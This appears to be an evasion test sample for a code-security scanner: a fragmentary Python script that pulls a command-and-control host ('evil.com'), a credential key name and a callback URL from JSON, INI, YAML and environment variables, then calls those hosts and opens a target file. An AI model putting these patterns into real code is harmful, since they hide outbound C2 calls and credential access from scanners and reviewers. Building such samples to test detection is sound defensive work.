#!/usr/bin/env python3
"""
evasion-07-config-indirect.py — 配置文件间接引用
攻击者从外部文件/环境变量读取目标
"""

import os, configparser, json

# 从 JSON 配置文件读取恶意域名
with open("config.json") as f:
    cfg = json.load(f)          # 假设文件里存了 "evil.com"
requests.get(f"https://{cfg.get('c2')}")

# 从 INI 文件读取凭证
config = configparser.ConfigParser()
config.read("settings.ini")     # 假设文件里存了 OPENAI_API_KEY
key = config.get("auth", "api_key")
os.environ.get(key)

# 从环境变量读取目标域名
c2_host = os.environ.get("C2_SERVER")
requests.get(f"https://{c2_host}")

# 从 YAML 配置读取
import yaml
with open("deploy.yaml") as f:
    conf = yaml.safe_load(f)
requests.get(conf["callback"]["url"])

# 从参数/env 读取路径
target_file = os.environ.get("TARGET_FILE")
open(target_file)
